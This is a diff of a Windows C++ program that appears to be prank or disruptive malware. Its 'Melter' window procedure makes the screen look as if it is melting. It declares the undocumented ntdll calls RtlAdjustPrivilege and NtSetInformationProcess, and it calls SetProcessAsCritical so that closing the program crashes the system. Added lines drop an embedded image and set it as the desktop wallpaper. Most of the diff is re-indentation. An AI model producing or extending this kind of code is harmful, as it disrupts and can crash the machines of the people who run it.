@@ -1,15 +1,8 @@
-#include <stdio.h>
-#include <Windows.h>
-#include <winternl.h>
-#include <conio.h>
-#include <iostream>
-#include <fstream>
-#include <winbase.h>
 #include "Header.h"
 
 using namespace std;
 
-#pragma comment(lib,"ntdll.lib")
+#pragma comment(lib, "ntdll.lib")
 
 EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
 EXTERN_C NTSTATUS NTAPI NtSetInformationProcess(HANDLE, ULONG, PVOID, ULONG);
@@ -21,41 +14,42 @@ LRESULT CALLBACK Melter(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
 {
 	switch (Msg)
 	{
-	case WM_CREATE:
-	{
-		HDC Desktop = GetDC(HWND_DESKTOP);
-		HDC Window = GetDC(hWnd);
+		case WM_CREATE:
+		{
+			HDC Desktop = GetDC(HWND_DESKTOP);
+			HDC Window = GetDC(hWnd);
 
-		BitBlt(Window, 0, 0, ScreenWidth, ScreenHeight, Desktop, 0, 0, SRCCOPY);
-		ReleaseDC(hWnd, Window);
-		ReleaseDC(HWND_DESKTOP, Desktop);
+			BitBlt(Window, 0, 0, ScreenWidth, ScreenHeight, Desktop, 0, 0, SRCCOPY);
+			ReleaseDC(hWnd, Window);
+			ReleaseDC(HWND_DESKTOP, Desktop);
 
-		SetTimer(hWnd, 0, Interval, 0);
-		ShowWindow(hWnd, SW_SHOW);
-		break;
-	}
-	case WM_PAINT:
-	{
-		ValidateRect(hWnd, 0);
-		break;
-	}
-	case WM_TIMER:
-	{
-		HDC Window = GetDC(hWnd);
-		int X = (rand() % ScreenWidth) - (150 / 2),
-			Y = (rand() % 15),
-			Width = (rand() % 150);
-		BitBlt(Window, X, Y, Width, ScreenHeight, Window, X, 0, SRCCOPY);
-		ReleaseDC(hWnd, Window);
-		break;
-	}
-	case WM_DESTROY:
-	{
-		KillTimer(hWnd, 0);
-		PostQuitMessage(0);
-		break;
-	}
-	return 0;
+			SetTimer(hWnd, 0, Interval, 0);
+			ShowWindow(hWnd, SW_SHOW);
+			break;
+		}
+		case WM_PAINT:
+		{
+			ValidateRect(hWnd, 0);
+			break;
+		}
+		case WM_TIMER:
+		{
+			HDC Window = GetDC(hWnd);
+			int X = (rand() % ScreenWidth) - (150 / 2),
+				Y = (rand() % 15),
+				Width = (rand() % 150);
+			BitBlt(Window, X, Y, Width, ScreenHeight, Window, X, 0, SRCCOPY);
+			ReleaseDC(hWnd, Window);
+			break;
+		}
+		case WM_DESTROY:
+		{
+			KillTimer(hWnd, 0);
+			PostQuitMessage(0);
+			break;
+		}
+		default:
+			return 0;
 	}
 	return DefWindowProc(hWnd, Msg, wParam, lParam);
 }
@@ -122,8 +116,13 @@ int APIENTRY WinMain(
 		SetProcessAsCritical();
 	}
 	// TODO: change picture load
+	ofstream savefile("log.jpg"); 
+	for (int x = 0; x < 13609; x++) {
+		savefile << *(jpg + x);
+	}
+	savefile.close();
 	// Set the wallpaper
-	const wchar_t* path = L"log.rc";
+	const wchar_t* path = L"log.jpg";
 	int result;
 	result = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)path, SPIF_UPDATEINIFILE);
 	cout << result << endl;
